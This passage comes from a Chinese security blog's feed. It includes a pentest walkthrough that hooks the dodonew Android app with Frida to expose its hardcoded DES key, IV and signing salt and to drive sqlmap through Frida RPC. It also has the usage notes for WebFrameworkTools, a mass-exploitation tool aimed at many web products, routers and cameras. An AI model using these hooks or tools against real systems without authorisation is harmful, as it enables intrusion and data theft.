title="最终测试截图"></a>最终测试截图</h2><ul><li>此篇文章提供思路,具体有不会编写。插件自己思考一下。或者百度参考。涉及到的脚本和细节问题以后如果创建内部群会详细讲解。关注博主的频道和github主页。了解最新动态。至此我们可以把hook出的明文直接在repeteror中填写然后发送利用brida实现自动加密解密。测试app。不过这种需要依赖app不稳定可能。</li>  </ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202303041519346.png" alt="最终测试结果"></p>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> Brida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java层自吐算法脚本-原创</title>
      <link href="/androidreverse/2023/02/articles/97121a1663073879/"/>
      <url>/androidreverse/2023/02/articles/97121a1663073879/</url>
      
        <content type="html"><![CDATA[<h1 id="frida-算法插件开发介绍"><a href="#frida-算法插件开发介绍" class="headerlink" title="frida 算法插件开发介绍"></a>frida 算法插件开发介绍</h1> <ul><li>现在的app逐渐重视起安全,把请求包和响应包采用进行加密。有的对数据进行sign签名校验。使我们抓到包也无法直接串改数据。另外app可能存在混淆或者是加固这使得我们利用反编译工具无法快速得到加密算法。就算是用的java层的api我们肉眼很难一下看出这个加密的方式所以写一个frida自吐算法的脚本变得尤为重要在安卓逆向当中。于是抽空开发出来一个Java层通杀算法脚本。脚本可能存在bug。有时间或者精力遇到在完善一下。</li></ul><h2 id="算法界面截图"><a href="#算法界面截图" class="headerlink" title="算法界面截图"></a>算法界面截图</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302182108012.png" alt="算法界面截图"></p><h2 id="frida演示"><a href="#frida演示" class="headerlink" title="frida演示"></a>frida演示</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302182119111.png" alt="frida演示"></p><h2 id="是否博主原创"><a href="#是否博主原创" class="headerlink" title="是否博主原创"></a>是否博主原创</h2><pre><code> <pre class="language-none"><code class="language-none">   是</code></pre></code></pre><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2>  <ul><li>下载地址:https://t.me/SoftwareUpdateChannel/72</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> original </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>app渗透测试请求包加密如何进行自动化测试</title>
      <link href="/androidreverse/2023/02/articles/ab0a8d0cab6627b4/"/>
      <url>/androidreverse/2023/02/articles/ab0a8d0cab6627b4/</url>
      
        <content type="html"><![CDATA[<h1 id="嘟嘟牛在线案例"><a href="#嘟嘟牛在线案例" class="headerlink" title="嘟嘟牛在线案例"></a>嘟嘟牛在线案例</h1><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2>  <ul><li>电脑usb真机连接手机界面如下</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131054823.png" alt="电脑usb真机连接"></p>  <ul><li>随便输入点击登录</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131051987.png" alt="随便输入点击登录"></p>  <ul><li>可能返回2,这里使用postern 和Charles 抓包。配置好postern代理</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131055974.png" alt="postern 和Charles"><br>    <ul><li>打开Charles进行抓包</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131055879.png" alt="Charles进行抓包"></p>  <pre class="language-抓包细节" data-language="抓包细节"><code class="language-抓包细节">POST &#x2F;api&#x2F;user&#x2F;login HTTP&#x2F;1.1If-Modified-Since: Sat, 11 Feb 2023 08:24:10 GMTContent-Type: application&#x2F;json; charset&#x3D;utf-8User-Agent: Dalvik&#x2F;2.1.0 (Linux; U; Android 10; Pixel Build&#x2F;QP1A.191005.007.A3)Host: api.dodovip.comConnection: Keep-AliveAccept-Encoding: gzipContent-Length: 248&#123;&quot;Encrypt&quot;:&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH\&#x2F;\&#x2F;FDsRnlBfgL4lcVxjXii\&#x2F;UNcdXYMk0EFbT8S8sTz7fW\n5ElmCRHm1SJQF76FKmSR9iSVviBXFx+vvRhLM14Q3LH+UIUx2DmyebXLy7V5vYDpFb5iABBQIvTu\nvGJ3s8vC3PVQwH6M+1oELCAimzf0qYiBzKfzU0Id4Rxf\&#x2F;FUJ+OJM5LbrL+rRwTMGBmTms2de\n&quot;&#125;响应包如下:HTTP&#x2F;1.1 200 OKDate: Sat, 11 Feb 2023 08:26:40 GMTContent-Type: application&#x2F;json;charset&#x3D;utf-8Transfer-Encoding: chunkedServer: NginxContent-Encoding: gzipConnection: keep-alive2v+DC2gq7Rs2vBLjHBwgrO0gyauGMTE6</code></pre><h2 id="使用工具查看是否是安卓控件开发的"><a href="#使用工具查看是否是安卓控件开发的" class="headerlink" title="使用工具查看是否是安卓控件开发的"></a>使用工具查看是否是安卓控件开发的</h2>  <ul><li>app 界面控件的查看 使用 uiautomatorviewer.bat是否是安卓开发的</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131056551.png" alt="uiautomatorviewer是否是安卓开发的"></p><h2 id="搜索请求包特征使用frida确定经过函数"><a href="#搜索请求包特征使用frida确定经过函数" class="headerlink" title="搜索请求包特征使用frida确定经过函数"></a>搜索请求包特征使用frida确定经过函数</h2>  <ul><li>我们使用jadx反编译一下看看</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131058522.png" alt="jadx反编译"><br>  <ul><li>包名是com.dodonew.online  来搜索请求包的特征搜索字符串 “Encrypt</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131058218.png" alt="含有Encrypt字符串"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131100328.png" alt="代码截图"><br>  <ul><li>搜索出有两个,确定到底是哪个使用frida来hook判断确定</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131100911.png" alt="frida hook判断"><br>  <ul><li>com.dodonew.online.http.JsonRequest  的这个方法是走的</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131101056.png" alt="确定加密流程1"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131102689.png" alt="确定加密流程2"><br>  <ul><li>com.dodonew.online.http.JsonRequest    paraMap 这个登陆是不走的</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131103661.png" alt="确定不走这个流程"></p><h2 id="跟踪分析流程和加密算法"><a href="#跟踪分析流程和加密算法" class="headerlink" title="跟踪分析流程和加密算法"></a>跟踪分析流程和加密算法</h2>  <ul><li>就看第一个了代码如下</li></ul>  <pre class="language-java" data-language="java"><code class="language-java">  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addRequestMap</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> addMap<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> time <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>addMap <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>addMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>addMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"timeStamp"</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> code <span class="token operator">=</span> <span class="token class-name">RequestUtil</span><span class="token punctuation">.</span><span class="token function">paraMap</span><span class="token punctuation">(</span>addMap<span class="token punctuation">,</span> <span class="token class-name">Config</span><span class="token punctuation">.</span>BASE_APPEND<span class="token punctuation">,</span> <span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> encrypt <span class="token operator">=</span> <span class="token class-name">RequestUtil</span><span class="token punctuation">.</span><span class="token function">encodeDesMap</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>desKey<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>desIV<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//key 65102933  iv  32028092</span><span class="token class-name">JSONObject</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>obj<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Encrypt"</span><span class="token punctuation">,</span> encrypt<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>mRequestBody <span class="token operator">=</span> obj <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">JSONException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> BASE_DES_IV <span class="token operator">=</span> <span class="token string">"32028092"</span><span class="token punctuation">;</span>  <span class="token comment">//字符串</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> BASE_DES_KEY <span class="token operator">=</span> <span class="token string">"65102933"</span> <span class="token comment">//字符串</span><span class="token keyword">this</span><span class="token punctuation">.</span>enCipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES/CBC/PKCS5Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>deCipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DES/CBC/PKCS5Padding"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </code></pre>    <ul><li>重点就是RequestUtil.encodeDesMap  </li></ul>    <pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">  Java.perform(function () &#123; &#x2F;&#x2F;java层的hook代码var jsonRequest&#x3D; Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;);console.log(&quot;test&quot;);jsonRequest.encodeDesMap.overload(&#39;java.lang.String&#39;, &#39;java.lang.String&#39;, &#39;java.lang.String&#39;).implementation&#x3D;function (data,key,iv)&#123;console.log(data);return this.encodeDesMap(data,key,iv);&#125;&#125;);  </code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131104677.png" alt="重点流程截图"></p>  <ul><li>现在sgin是不知道怎么来的看看  sign值如下  </li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131105180.png" alt="sign加密流程"></p>  <ul><li>String checkCode = Utils.md5(builder.toString()).toUpperCase();    addMap.put("sign", checkCode);  </li></ul>  <h2 id="编写firda-hook代码"><a href="#编写firda-hook代码" class="headerlink" title="编写firda hook代码"></a>编写firda hook代码</h2><p>  hook代码</p>  <pre class="language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">  Java.perform(function () &#123; &#x2F;&#x2F;java层的hook代码var Utils&#x3D; Java.use(&quot;com.dodonew.online.util.Utils&quot;);console.log(&quot;testaa&quot;);Utils.md5.implementation&#x3D;function (data)&#123;console.log(&quot;sign数据:&quot;+data);var md5&#x3D;this.md5(data);console.log(md5);return md5;&#125;var RequestUtil&#x3D; Java.use(&quot;com.dodonew.online.http.RequestUtil&quot;);console.log(&quot;test&quot;);RequestUtil.encodeDesMap.overload(&#39;java.lang.String&#39;, &#39;java.lang.String&#39;, &#39;java.lang.String&#39;).implementation&#x3D;function (data,key,iv)&#123;console.log(&quot;要加密的数据:&quot;,data);var encodeData&#x3D; this.encodeDesMap(data,key,iv);console.log(encodeData);return encodeData;&#125;&#125;);  </code></pre><h2 id="加密流程分析"><a href="#加密流程分析" class="headerlink" title="加密流程分析"></a>加密流程分析</h2>  <ul><li>sign数据:equtype=ANDROID&loginImei=Androidnull&timeStamp=1676112935252&userPwd=111&username=111125563&key=sdlkjsdljf0j2fsjkde729eee7e7c53f220292712c686b94d要加密的数据: {"equtype":"ANDROID","loginImei":"Androidnull","sign":"DE729EEE7E7C53F220292712C686B94D","timeStamp":"1676112935252","userPwd":"111","username":"111125563"}NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii/UNcdXYMk0EHdbdwRDGADPvJlZMZqsYcRLgBo9ZcfD+QFQcNIEUonlHHkJ40A/3P/7z+jmJS0Tr3kaMU/y5tVOjyDyQIAskXC+ZknputIDnDC1V23cu2PAeGn/EnUn367Pj0cdcOVWQ1k+Rg4qybOMnYUVOLvG8SA==<p>总体流程是 </p><p>md5(equtype&#x3D;ANDROID&amp;loginImei&#x3D;Androidnull&amp;timeStamp&#x3D;1676112935252&amp;userPwd&#x3D;111&amp;username&#x3D;111125563&amp;key&#x3D;sdlkjsdljf0j2fsjk)  至于是不是标准的md5暂不看</p><p>然后在把数据变成json数据</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131108917.png" alt="加密流程截图"></p><pre class="language-分析代码" data-language="分析代码"><code class="language-分析代码">key是md5以后 弄成十六进制iv 是直接十六进制public static final String BASE_DES_IV &#x3D; &quot;32028092&quot;;  &#x2F;&#x2F;字符串public static final String BASE_DES_KEY &#x3D; &quot;65102933&quot; &#x2F;&#x2F;字符串this.enCipher &#x3D; Cipher.getInstance(&quot;DES&#x2F;CBC&#x2F;PKCS5Padding&quot;);this.deCipher &#x3D; Cipher.getInstance(&quot;DES&#x2F;CBC&#x2F;PKCS5Padding&quot;);key:c3d26dca86259782bd9186481f892ae6       Hex byteiv:3332303238303932                          hex byte</code></pre><h2 id="使用工具模拟解密请求数据包"><a href="#使用工具模拟解密请求数据包" class="headerlink" title="使用工具模拟解密请求数据包"></a>使用工具模拟解密请求数据包</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131109046.png" alt="工具模拟解密加密数据"></p><h2 id="编写hook脚本在bp可以对明文进行修改"><a href="#编写hook脚本在bp可以对明文进行修改" class="headerlink" title="编写hook脚本在bp可以对明文进行修改"></a>编写hook脚本在bp可以对明文进行修改</h2>  <ul><li>既然先经过md5然后我们可以编写一个脚本让他经过bp来修改进行测试  参考脚本https://github.com/L3B1anc/simpleencrypt</li></ul>  <ul><li>修改一下我们  核心代码</li></ul>  <pre class="language-none"><code class="language-none">     send(string)      var op &#x3D; recv(function(value) &#123;    console.log(&quot;&lt;li&gt; js recv encryptdata content: &quot; + value);    string &#x3D;  value;&#125;);op.wait();    </code></pre>  <ul><li>hook.js    编写这个是重点注意 方法内修改属于值传递所以需要吧用户名和密码单独提取出来进行赋值修改  代码如截图</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131110884.png" alt="hook.js代码"><br>  <ul><li>frida_hook.py </li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131111483.png" alt="frida_hook.py"></p>  <ul><li>trace.py 脚本</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131113997.png" alt="trace.py"></p><h2 id="实战hook修改明文"><a href="#实战hook修改明文" class="headerlink" title="实战hook修改明文"></a>实战hook修改明文</h2>  <ul><li>启动frida  server  怎么安装和启动情况博客里面的教程。先运行frida-hook.py脚本 在运行trace.py脚本 </li></ul><ul><li>frida-hook.py 运行界面</li></ul><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131114596.png"><br>  <ul><li>trace.py  运行界面</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131200366.png"><br>  <ul><li>配置好bp代理手机点击登录</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131202132.png" alt="bp代理配置"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131207335.png" alt="hook后数据截图"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131208424.png" alt="软件解密"></p>  <ul><li>这就可以测试了</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131209919.png" alt="bp测试"></p><h2 id="自动化对功能进行测试-frida-RPC主动调用"><a href="#自动化对功能进行测试-frida-RPC主动调用" class="headerlink" title="自动化对功能进行测试(frida  RPC主动调用)"></a>自动化对功能进行测试(frida  RPC主动调用)</h2>  <ul><li>如何进行自动化测试呢比如我用sqlmap 对用户名和密码进行测试如何进行。这时候就不用hook了我们使用rpc主动调用来测试执行。需要修改trace.py  增加python发包请求添加rpc主动调用  </li></ul>  <ul><li>firda开启远程监听模式</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131212809.png" alt="frida远程监听"></p>  <ul><li>修改后的trace.py代码截图  关键代码截图</li></ul>     <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131213141.png" alt="修改后的trace.py代码截图"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131214712.png" alt="运行trace.py"><br>  <ul><li>至此就可以任意进行测试了</li></ul></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131215079.png" alt="自动化测试截图"></p>  <ul><li>完整代码以及测试app 内部放出</li></ul>  <p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302131216648.png" alt="完整代码以及测试app"></p>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChatGpt使用和注册|ChatGpt-C#客户端</title>
      <link href="/chatgpt/2023/02/articles/5f434729a12aeff4/"/>
      <url>/chatgpt/2023/02/articles/5f434729a12aeff4/</url>
      
        <content type="html"><![CDATA[<h1 id="ChatGpt注册"><a href="#ChatGpt注册" class="headerlink" title="ChatGpt注册"></a>ChatGpt注册</h1> <ul><li>参考文章:https://baijiahao.baidu.com/s?id=1757224229351914188&wfr=spider&for=pc</li></ul><h2 id="ChatGpt客户端使用"><a href="#ChatGpt客户端使用" class="headerlink" title="ChatGpt客户端使用"></a>ChatGpt客户端使用</h2>  <ul><li>注册好了然后去网站生成apikey然后打开软件的ChatGPTCS.exe.config 里面的value="你申请的key"</li></ul>  <h2 id="ChatGpt演示使用"><a href="#ChatGpt演示使用" class="headerlink" title="ChatGpt演示使用"></a>ChatGpt演示使用</h2><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202302081326727.png" alt="ChatGpt演示"></p><h2 id="ChatGpt下载"><a href="#ChatGpt下载" class="headerlink" title="ChatGpt下载"></a>ChatGpt下载</h2>  <ul><li>下载地址:https://t.me/SoftwareUpdateChannel/61</li></ul>]]></content>
      
      
      <categories>
          
          <category> ChatGpt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>综合性exp|poc渗透工具-WebFrameworkTools5.1-本篇需要科学上网查看</title>
      <link href="/securitytools/2023/02/articles/17280a163317a770/"/>
      <url>/securitytools/2023/02/articles/17280a163317a770/</url>
      
        <content type="html"><![CDATA[<h1 id="软件用法"><a href="#软件用法" class="headerlink" title="软件用法"></a>软件用法</h1><h2>WebFrameworkTools-5.1-main 5.0工具使用方法</h1><ul>  内置exp模式url.txt 中网站一行一个且必须以http:// https:// 开头<br/>启动勾选模式,需要创建include.txt。模块一行一个具体看 勾选功能演示<br/>启动排除模块模式,需要创建uninclude.txt。模块一行一个具体看 排除模块功能演示<br/>WebFrameworkTools-5.1-main.exe 所有exp都跑使用默认线程模式(注意劲量不要使用全部模块一个耗时太长。另一个有waf被ban ip导致速度变慢建议使用勾选模块方式或者指定模块。如果您确定没有waf什么影响那么全部模块没毛病!!!)<br/>WebFrameworkTools-5.1-main.exe  -m 列出所有内置模块名称<br/>WebFrameworkTools-5.1-main.exe  -thread 200 所有exp都跑使用自定义线程模式<br/>WebFrameworkTools-5.1-main.exe -type thinkphp 使用默认线程跑 thinkphp框架漏洞使用说明<br/>WebFrameworkTools-5.1-main.exe -type thinkphp -thread 200 使用自定义线程 线程跑 thinkphp框架漏洞<br/>WebFrameworkTools-5.1-main.exe -url http://www.baidu.com<br/>WebFrameworkTools-5.1-main.exe -url http://www.baidu.com -thread 30<br/>WebFrameworkTools-5.1-main.exe -url http://www.baidu.com/ -type thinkphp<br/>WebFrameworkTools-5.1-main.exe -url http://www.baidu.com -type thinkphp -thread 30<br/>用户自定义dll模式 同目录下创建userdll.txt即可进入用户自定义模式WebFrameworkTools.exe   跑所有dll</br>WebFrameworkTools.exe -thread 30 线程是30跑所有dll</br>WebFrameworkTools.exe -dllname test.dll 默认线程跑test.dll(test.dll为例子此处名字是任意)</br>WebFrameworkTools.exe -dllname test.dll -thread 30     30个线程跑test.dll(test.dll为例子此处名字是任意)</br>WebFrameworkTools.exe -url http://www.baidu.com      指定网站默认线程跑所有dll</br>WebFrameworkTools.exe -url http://www.baidu.com -thread 30        指定网站30个线程跑所有dll</br>WebFrameworkTools.exe -url http://www.baidu.com -dllname test.dll    默认线程跑指定dll(由于只有一个dll一个网站就使用默认线程就行了)</br>一键生成dll,Dllplugins.dll 是内置dll不要尝试加载。对于批量dll话在软件目录添加一个dll目录即可进行批量。其他和内置exp操作一样。注意一键生成dll软件除post数据框那里可以有带双引号的数据。其他所有地方都不允许有双引号否则会编译失败!!!使用如下图:<p> <img src="https://raw.githubusercontent.com/peiqiF4ck/WebFrameworkTools-5.1-main/main/UserExpDll.png" alt="userage"><br> 演示忘记截图加ThreadHelper.dll 必须要有否则报错。。<br> <img src="https://raw.githubusercontent.com/peiqiF4ck/WebFrameworkTools-5.1-main/main/UserDllExpHelp.png" alt="userage"><br> <img src="https://raw.githubusercontent.com/peiqiF4ck/WebFrameworkTools-5.1-main/main/DllAttack.png" alt="userage"><br>  如果要使用勾选功能见上图实测效果。勾选功能演示。如果想启用排除模块功能,请看排除模块功能截图演示 如果想自定义作者见自定义作者演示图<br/><br>内置exp模块<br>集成漏洞如下(-type参数) 注意有的type参数虽然标注了两个类别但并不代表这个参数只包含这两个漏洞!!!!<br/><br>thinkphp<br/><br>weblogic<br/><br>struts2<br/><br>hadoop<br/><br>atlassiancrowd<br/><br>ueditor<br/><br>tongdaoa<br/><br>apacheflink<br/><br>ruijie<br/><br>apachedruid<br/><br>router(dlink rce漏洞,三星路由器,dlink密码泄露,飞鱼星路由器信息泄露,中国移动 禹路由未获授权访问,密码敏感信息泄露, D-Link ShareCenter DNS-320 rce,Dlink 弱密码)<br>  cloudRouter密码泄露,三星 wlan AP 命令执行<br/><br>solr<br/><br>activemq<br/><br>tomcat<br/><br>unomi<br/><br>es<br/><br>fastjson<br/><br>jenkins<br/><br>vmvcenter<br/><br>webcam(DVR摄像头,D-Link-DCS,ACTI Camera 任意文件读取漏洞,海康威视流媒体密码泄露,任意文件读取,浙江大华DSS  任意文件下载,<br> Finetree-5MP-摄像机 未授权添加账号密码,弱密码，海康威视视频网管任意文件读取,汇捷通云视频任意文件读取,Jellyfin 任意文件读取漏洞,<br>Selea OCR-ANPR摄像机文件读取漏洞,H5S视频平台未授权)<br/><br>nexus<br/><br>bigip<br/><br>messasolu<br/><br>ofbiz<br/><br>jboss<br/><br>shiro<br/><br>springboot<br/><br>weaveroa(泛微OA,泛微 Emoblie 6.6 RCE),WorkflowServicexml rce,泛微OA 任意文件上传xday<br/><br>hwcms(帆软 V9 任意文件覆盖文件上传，浪潮ClusterEngine 4.0 RCE,和信下一代云桌面VENGD 上传漏洞,齐治科技-堡垒机任意用户登录，红帆oA,金山 V8 终端安全系统,启莱OAsql注入漏洞)<br> 汉王考勤系统sql注入漏洞,金何OA C6 任意文件读取漏洞,极通EWEBS任意文件包含, ShiziyuCms 注入,ShopOX 任意文件下载漏洞,TamronOS IPTV命令执行协达Oa 任意文件下载<br> 任务调度弱口令,好视通文件读取漏洞,xx捷CRM,教学管理ERP<br/><br>firewall(360新天擎sql注入(线程调到最低!!!测试否则会漏洞网站),360新天擎未授权接口访问,奇安信 网康防火墙 代码执行,FineReport（帆软）报表系统目录遍历漏洞)<br>  h3防火墙任意文件读取漏洞,佑友-佑友防火墙命令执行,Zeroshell 防火墙rce,xxx一体机rce漏洞<br/><br>seeyonoa(致远OA)<br/><br>yongyougrp((用友GRP))<br/><br>eyou<br/><br>voip<br/><br>thinkcmf<br/><br>natshell(蓝海卓越宽带计费系统)<br/><br>h3c(h3c intelligent management)<br/><br>yongyouuf(用友UFiDa BshServlet rce)<br/><br>ezoffice(万户ezOFFICE上传漏洞)<br/><br>yapi<br/><br>nacos<br/><br>apachekylin<br/><br>atlassianjira<br/><br>coremail<br/><br>landrayoa</br><br>yongyouu8</br><br>git(git信息泄露)<br/><br>dkey<br/><br>webui<br/><br>webmail<br/><br>yunwei(Kyan账号密码泄露,AI网络运维平台RCE)<br/><br>zujian(php v8.1 后门)<br/><br>sangfor<br/><br>wlan(AC集中管理平台弱口令)<br/><br>vpn(网康 NS-ASG 应用安全网关文件下载)<br/><br>atlassianconfl<br/><br>phpstudy<br/><br>apache<br/><br>gitlab(CVE-2021-22205,gitlab 邮箱信息泄露)<br/><br>baoleiji<br/><br>apachesou(CVE-2021-37580)<br/><br>weiphp<br/><br>upload(以后此为上传组件类集合:webuploader)<br/><br>gateway(网关,流媒体,视频终端合集,接口)<br/><br>nodejs<br/><br>x5<br/><br>konga<br/><br>drupal<br/><br>joomla<br/><br>grafana<br/><br>bootdo<br/><br>log4j(Http Header Fuzzing(16)|Apache SkyWalking|Seeyon OA|MobileIrons|Apache solr|APACHE-Druid|APACHE OFBiz No Testing|APACHE Struts2|vmware-Horizon|vmware vcenter|XenMobile|UniFiNetwork|vmware-Workspace No Testing!!!|weblogic log4j)<br/><br>phpmyadmin(phpmyadmin相关漏洞更新)<br/><br>apisix(Apache APISIX Dashboard)</br><br>hardware(硬件漏洞)<br/><br>htoa<br/><br>api(接口漏洞集合)<br/><br>sunlogin<br/><br>zabbix<br/><br>spring(此为spring类型漏洞集合)<br/><br>cms(常见cms cmseasy)<br/><br>vmware(vmwareworkspace,vmware系列产品集合)<br/><br>zimbra(zimbra系列产品漏洞集合)<br/><br>oaAll(不知名oa漏洞集合)<br/><br>如果会在软件同目录下生产shell.txt。注意括号内的不是type参数是支持哪些漏洞例如router(dlink,三星路由器) 这个-type router这么写就o了</p><h2 id="软件注意事项"><a href="#软件注意事项" class="headerlink" title="软件注意事项"></a>软件注意事项</h2><ul><li>软件需要安装.netframwork 4.5.1 极其以上版本并且需要安装C++类库</li>  <li>使用自定义模式单个url。可以自己指定线程设置线程小。用默认线程20出的结果可能不准确</li>  <li>本来软件不打算集成例如文件读取信息泄露等漏洞。但是为了渗透实战中获取更大成果决定以后加入除直接拿shell,rce等高危漏洞其他次高危漏洞和某些有价值的中危漏洞!!!。另外本软件只集成框架漏洞。但是为了因为实战中资产数目庞大可能涉及的不只是框架还有可能目标旁站或者C段有某些cms。所以现决定把特征不明显的cms加入本软件特征明显并且是直接出数据和getshell的加入我的另一款图形化工具cms识别自动测试的工具。CmsExpAttackProgram中。两者互相查漏补缺。相互扶持发挥它们各自的优势!!!</li>  <li>另外说一下跑沙箱检测的有爆毒。怀疑是木马文件的这些人建议删除本软件别用就行。此软件采用c#和c++混合开发另外加了net和c++的强壳。如果爆毒属于正常如果有人担心木马病毒那么建议删除本软件。另外软件免费。我没有求着你们用。软件打不开的问题看git说明。别动不动脑残就知道发issu和私信。私信几十封我真看不过来。。。。 </li> <li>切勿利用本工具对未授权的网站进行非法攻击。由此产生的法律后果由使用者自行承担!!!</li>  <li>2021-04-24加入勾选功能如果需要使用勾选功能在同目录创建include.txt里面加入自定义的检测类型即可。使用效果(见:上图实测效果 